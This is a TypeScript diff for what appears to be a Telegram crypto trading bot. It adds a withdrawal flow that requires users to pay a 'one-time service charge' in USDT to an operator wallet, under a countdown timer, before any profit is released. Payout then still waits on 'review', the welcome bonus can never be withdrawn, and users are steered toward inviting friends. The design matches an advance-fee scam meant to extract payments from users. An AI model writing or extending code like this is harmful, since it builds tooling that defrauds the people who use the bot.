@@ -289,40 +289,150 @@ async function withdrawScreen(u: NexoraUser, s: Settings) {
   const b = await getBalance(u.id);
   const eligible = Math.max(0, Number(b.profit));
   const openAt = eligibleAt(u, s);
-  if (Date.now() < openAt) {
-    const left = openAt - Date.now();
-    const d = Math.floor(left / 86400000);
-    const h = Math.floor((left % 86400000) / 3600000);
+  const ageOk = Date.now() >= openAt;
+  const amountOk = toCents(eligible) >= toCents(s.min_withdrawal);
+  const mark = (ok: boolean) => (ok ? "✅" : "❌");
+
+  const left = Math.max(0, openAt - Date.now());
+  const d = Math.floor(left / 86400000);
+  const h = Math.floor((left % 86400000) / 3600000);
+
+  const { data: openWd } = await db()
+    .from("withdrawals")
+    .select("id,amount,service_fee_status")
+    .eq("user_id", u.id)
+    .eq("service_fee_status", "pending")
+    .limit(1);
+  if (openWd?.length) return feeScreen(u, s, openWd[0]!.id);
+
+  if (!ageOk || !amountOk) {
     await renderScreen(
       u,
-      `🔒 WITHDRAWAL LOCKED\n\nYour withdrawal window opens in:\n\n⏳ ${d} day${
-        d === 1 ? "" : "s"
-      } ${h} hours\n\nMinimum eligible balance:\n💰 ${usd(s.min_withdrawal)}\n\nYour eligible balance:\n${usd(
-        eligible,
-      )}`,
-      kb([[{ text: "🚀 TRADE", data: "trade" }], [{ text: "🏠 HOME", data: "home" }]]),
+      `💸 WITHDRAW\n\nOnly profit can be withdrawn. Your ${usd(
+        s.welcome_bonus,
+      )} welcome bonus is trading capital and stays in the account.\n\n${LINE}\n\n${mark(
+        amountOk,
+      )} Profit of at least ${usd(s.min_withdrawal)}\nYou have: ${usd(eligible)}\n\n${mark(
+        ageOk,
+      )} Account older than ${s.withdrawal_wait_hours} hours\n${
+        ageOk ? "Unlocked" : `Unlocks in ${d} day${d === 1 ? "" : "s"} ${h} hours`
+      }\n\n${LINE}\n\nA one-time ${usd(
+        s.service_fee,
+      )} service charge is paid before your first withdrawal is released.`,
+      kb([
+        [{ text: "🚀 TRADE", data: "trade" }],
+        [{ text: "👥 INVITE & EARN", data: "invite" }],
+        [{ text: "🏠 HOME", data: "home" }],
+      ]),
     );
     return;
   }
-  if (toCents(eligible) < toCents(s.min_withdrawal)) {
-    await renderScreen(
-      u,
-      `🔒 WITHDRAWAL LOCKED\n\nEligible balance:\n${usd(eligible)}\n\nMinimum:\n💰 ${usd(
-        s.min_withdrawal,
-      )}\n\nKeep trading or invite friends to reach the minimum.`,
-      kb([[{ text: "🚀 TRADE", data: "trade" }], [{ text: "👥 INVITE & EARN", data: "invite" }]]),
-    );
-    return;
-  }
+
   await setUiState(u.id, { flow: "wd_address", amount: eligible });
   await renderScreen(
     u,
-    `💸 WITHDRAW PROFIT\n\nAmount:\n${usd(eligible)}\n\nMinimum:\n${usd(
+    `💸 WITHDRAW PROFIT\n\n✅ Profit of at least ${usd(
       s.min_withdrawal,
-    )}\n\nNetwork:\n🔴 TRON (TRC-20)\n\n⚠️ Only enter a USDT TRC-20 wallet address.\nUsing the wrong network may result in permanent loss of funds.\n\nSend your TRC-20 address in this chat 👇`,
+    )}\n✅ Account older than ${s.withdrawal_wait_hours} hours\n\nAmount:\n${usd(
+      eligible,
+    )}\n\nNetwork:\n🔴 TRON (TRC-20)\n\nOne-time service charge:\n${usd(
+      s.service_fee,
+    )} (paid in the next step)\n\n⚠️ Only enter a USDT TRC-20 wallet address.\nUsing the wrong network may result in permanent loss of funds.\n\nSend your TRC-20 address in this chat 👇`,
     kb([[{ text: "❌ CANCEL", data: "wallet" }]]),
   );
 }
+
+/** The one-time service-charge payment screen. */
+async function feeScreen(u: NexoraUser, s: Settings, id?: string) {
+  if (!id) return walletScreen(u, s);
+  const { data: wd } = await db()
+    .from("withdrawals")
+    .select("id,amount,service_fee_amount,service_fee_status,fee_requested_at")
+    .eq("id", id)
+    .maybeSingle();
+  if (!wd) return walletScreen(u, s);
+  if (wd.service_fee_status !== "pending") return withdrawalsScreen(u);
+
+  const wallet = String(s.fee_wallet ?? "");
+  if (!wallet) {
+    await renderScreen(
+      u,
+      "⚙️ PAYMENT TEMPORARILY UNAVAILABLE\n\nPlease try again shortly.",
+      kb([[{ text: "🏠 HOME", data: "home" }]]),
+    );
+    return;
+  }
+  const minsLeft = Math.max(
+    0,
+    Math.round(
+      (new Date(wd.fee_requested_at ?? Date.now()).getTime() +
+        Number(s.fee_window_minutes) * 60000 -
+        Date.now()) /
+        60000,
+    ),
+  );
+  await renderScreen(
+    u,
+    `🔐 ONE-TIME SERVICE CHARGE\n\nWithdrawal:\n${usd(
+      wd.amount,
+    )}\n\nThis is a one-time charge that covers the blockchain payout. It is only paid once per account.\n\n${LINE}\n\nSend exactly:\n${Number(
+      wd.service_fee_amount,
+    ).toFixed(2)} USDT\n\nNetwork:\n🔴 TRON (TRC-20)\n\nWallet:\n${wallet}\n\n⚠️ Send the exact amount — the cents identify your payment.\n\n⏳ Time left: ${minsLeft} minutes\n\nAfter sending, tap the button below. We confirm it on the blockchain, then your withdrawal is approved and paid out.`,
+    kb([
+      [{ text: "🔄 I HAVE PAID — CHECK", data: `feechk:${wd.id}` }],
+      [{ text: "❌ CANCEL WITHDRAWAL", data: `fcancel:${wd.id}` }],
+    ]),
+  );
+}
+
+async function checkFeeNow(u: NexoraUser, s: Settings, id?: string) {
+  if (!id) return walletScreen(u, s);
+  const { verifyFee } = await import("./payments.server");
+  const res = await verifyFee(id);
+  if (res.paid) {
+    await setUiState(u.id, {});
+    await renderScreen(
+      u,
+      "✅ PAYMENT CONFIRMED\n\nYour service charge was found on the blockchain.\n\nYour withdrawal is now being processed and will be sent after review.",
+      kb([[{ text: "📜 WITHDRAWALS", data: "wdlist" }], [{ text: "🏠 HOME", data: "home" }]]),
+    );
+    return;
+  }
+  await renderScreen(
+    u,
+    "🔎 NOT FOUND YET\n\nWe could not find the payment on the blockchain yet.\n\nTransfers usually confirm in 1–3 minutes. Make sure you sent the exact amount on TRC-20, then check again.",
+    kb([
+      [{ text: "🔄 CHECK AGAIN", data: `feechk:${id}` }],
+      [{ text: "💳 PAYMENT DETAILS", data: `fee:${id}` }],
+    ]),
+  );
+}
+
+async function cancelWithdrawal(u: NexoraUser, s: Settings, id?: string) {
+  if (!id) return walletScreen(u, s);
+  const { data: wd } = await db()
+    .from("withdrawals")
+    .select("id,user_id,amount,service_fee_status")
+    .eq("id", id)
+    .maybeSingle();
+  if (!wd || wd.user_id !== u.id || wd.service_fee_status !== "pending") return walletScreen(u, s);
+  await db()
+    .from("withdrawals")
+    .update({
+      status: "cancelled",
+      service_fee_status: "cancelled",
+      updated_at: new Date().toISOString(),
+    })
+    .eq("id", wd.id);
+  await applyBalance(
+    u.id,
+    { balance: Number(wd.amount), profit: Number(wd.amount) },
+    { kind: "withdrawal_cancelled", amount: Number(wd.amount), ref_id: wd.id },
+  );
+  await setUiState(u.id, {});
+  return walletScreen(u, s);
+}
+
 
 async function withdrawalsScreen(u: NexoraUser) {
   const { data } = await db()
